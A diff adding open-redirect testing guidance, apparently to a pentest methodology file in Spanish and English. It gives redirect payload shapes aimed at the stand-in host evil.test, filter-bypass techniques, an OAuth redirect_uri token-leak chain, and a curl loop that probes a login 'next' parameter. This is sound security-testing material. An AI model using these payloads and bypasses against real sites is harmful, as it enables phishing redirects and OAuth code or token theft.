@@ -114,6 +114,51 @@ chains_with: [auth-bypass, xss, csrf]
 - `ffuf`/`nuclei -tags redirect` — breadth sweep.
 - Burp Suite — intercept and modify the actual OAuth flow for the `redirect_uri` bypass testing.
 
+## Payloads & Detection Patterns
+
+La familia son **shapes de URL**, no payloads clásicos. La prueba es un `Location` 3xx (o
+navegación confirmada en browser para sinks JS) a un dominio que controlas, fuera del target; un
+200 que solo refleja la string en el body NO es redirect.
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| Absolute external | `?next=https://evil.test` | Redirect off-domain directo |
+| Protocol-relative | `?next=//evil.test`, `?next=/\evil.test` | Browser trata `//` y `\` como esquema-relativo |
+| Missing/single slash | `?next=https:evil.test`, `?next=https:/evil.test` | Pasa checks "empieza con http" |
+| Userinfo trick | `?next=https://target.com@evil.test` | El host real es evil.test; `target.com` es userinfo |
+| Domain confusion | `?next=https://target.com.evil.test`, `?next=https://evil.target.com` | Engañar un substring-match de dominio |
+| Encoded/whitespace | `?next=/%2F%2Fevil.test`, `?next=%09https://evil.test` | Evadir filtro por encoding/tab |
+| OAuth redirect_uri | `redirect_uri=https://target/callback/../evil`, `...callback%2F@evil.test` | Fuga de code/token (crítico) |
+| Header/JS sink | `Referer: https://evil.test`; `window.location=getParam('next')` | Location desde header o sink client-side |
+
+Surface signals que delatan la clase antes de probar:
+- Params `next`, `redirect`, `redirect_uri`, `return`, `continue`, `url`, `dest`, `goto`,
+  `callback` en login/logout/OAuth/link-tracking.
+- OAuth con validación laxa de `redirect_uri` (prefix/substring en vez de exact match).
+- `Location` en una respuesta 3xx construido de input del usuario.
+- `window.location`/`location.href`/`location.replace`/meta-refresh con URL dinámica.
+
+```bash
+# inspeccionar el Location directamente (sin auto-follow); confirmar host externo
+for p in "https://evil.test" "//evil.test" "https:evil.test" "https://target.com@evil.test" "/%2F%2Fevil.test"; do
+  echo "== $p =="; curl -sI "https://target/login?next=$p" | grep -i '^location:'
+done
+# 3xx con Location a evil.test = prueba; 200 que solo contiene la string = NO
+```
+
+## Bypass Techniques
+
+Agrupadas por la validación de redirect evadida; probar la familia completa antes de declarar N/A.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| "Empieza con http" | `//evil.test`, `/\evil.test`, `https:evil.test` | Esquema-relativo evade el prefijo esperado |
+| "Contiene el dominio target" (substring) | `https://target.com@evil.test`, `https://target.com.evil.test`, `https://evil.test/target.com` | Substring presente pero el host es evil |
+| Blocklist literal del dominio evil | Encoding `%2F%2F`, doble-encode, tab `%09`, backslash | Validador no normaliza antes de comparar |
+| OAuth exact-match ausente | Path-append `/callback/../evil`, suffix `callback.evil.test` | La spec exige exact string match del registered value |
+| redirect_uri bajo dominio confiado | Usar un open redirect propio del target como `redirect_uri` | Encadena OR + OAuth → robo de code/token |
+| Solo relative paths permitidos | N/A si no hay forma de salir del dominio | Note como N/A, no finding sin bypass real |
+
 ## Root Causes
 
 - Redirect target taken directly from user input with no allowlist of permitted destinations
